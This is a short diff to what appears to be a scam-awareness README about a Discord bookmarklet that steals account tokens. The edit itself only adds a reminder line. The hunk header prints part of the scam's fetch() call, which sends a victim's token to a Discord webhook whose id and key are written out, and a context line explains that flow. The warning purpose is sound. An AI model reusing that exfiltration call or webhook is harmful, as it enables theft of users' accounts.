@@ -56,7 +56,7 @@ fetch("https://discord.com/api/webhooks/939322818280185906/ZkaQPqSP-vOrUdIObzR0Q
    - The victims token will be sent over the webhook to their Discord's `#mod-logs` hidden channel.
 
 ## ⛔ Heads up!
-People have fallen for this, due to this tactic not being widely seen. I hate to see people loose time and money due to this.
+People have fallen for this, due to this tactic not being widely seen. I hate to see people loose time and money due to this. Remember the notes below.
 - If you are prompted to add a bookmarklet, proceed with caution! Bookmarklets can become way more complex than this scam.
 - Do not leave sensitive information lying around in your Discord account! There are lots of grabbers nowdays, lmfao.
 - Dont believe Discord DM advertisements, they are always false.
